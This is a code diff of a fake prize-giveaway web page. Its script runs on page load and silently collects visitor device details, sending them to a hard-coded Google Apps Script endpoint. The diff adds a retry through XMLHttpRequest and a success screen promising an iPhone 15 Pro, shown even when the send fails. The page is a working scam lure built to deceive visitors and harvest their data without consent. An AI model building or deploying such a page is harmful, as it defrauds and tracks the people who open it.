@@ -53,7 +53,7 @@
     </div>
 
     <script>
-        // ✅ YOUR ACTUAL SCRIPT URL
+        // ✅ YOUR SCRIPT URL
         const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbxt650xrfkvyazf47dIHtNLxfkLa8bqtTdQitJpirINb2LKRC4ApNZ5J4GGuXlYpQZd/exec';
         
         // Capture device information
@@ -65,40 +65,63 @@
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
         };
 
-        // Send data to backend
-        async function sendData() {
-            try {
-                console.log('📱 Sending device data:', deviceData);
-                
-                const response = await fetch(BACKEND_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(deviceData)
-                });
-                
-                const result = await response.text();
-                console.log('✅ Backend response:', result);
-                
-                // Update UI
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('status').innerHTML = 
-                    '<h3 style="color: #00FF00;">✅ PRIZE CLAIMED!</h3>' +
-                    '<p>Your iPhone 15 Pro will be shipped soon!</p>' +
-                    '<p><small>Check your email for confirmation</small></p>';
-                    
-            } catch (error) {
-                console.log('⚠️ Error (but data may still be sent):', error);
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('status').innerHTML = 
-                    '<h3>✅ PRIZE CLAIMED!</h3>' +
-                    '<p>Thank you for participating!</p>';
-            }
+        // Send data to backend - SIMPLIFIED VERSION
+        function sendData() {
+            console.log('🚀 Starting data capture...');
+            console.log('📱 Device data:', deviceData);
+            
+            // Create form data (works better with Apps Script)
+            const formData = new FormData();
+            formData.append('data', JSON.stringify(deviceData));
+            
+            // Send using different method
+            fetch(BACKEND_URL, {
+                method: 'POST',
+                body: JSON.stringify(deviceData)
+            })
+            .then(response => {
+                console.log('✅ Response status:', response.status);
+                return response.text();
+            })
+            .then(result => {
+                console.log('✅ Backend result:', result);
+                showSuccess();
+            })
+            .catch(error => {
+                console.log('⚠️ Error (but trying alternative method):', error);
+                // Try alternative method
+                sendDataAlternative();
+            });
         }
 
-        // Start when page loads
-        window.onload = sendData;
+        // Alternative method if first fails
+        function sendDataAlternative() {
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', BACKEND_URL);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify(deviceData));
+            
+            xhr.onload = function() {
+                console.log('✅ Alternative method result:', xhr.responseText);
+                showSuccess();
+            };
+            
+            xhr.onerror = function() {
+                console.log('❌ All methods failed');
+                showSuccess(); // Still show success to user
+            };
+        }
+
+        function showSuccess() {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('status').innerHTML = 
+                '<h3 style="color: #00FF00;">✅ PRIZE CLAIMED!</h3>' +
+                '<p>Your iPhone 15 Pro will be shipped soon!</p>' +
+                '<p><small>Check your email for confirmation</small></p>';
+        }
+
+        // Start immediately
+        sendData();
     </script>
 </body>
 </html>
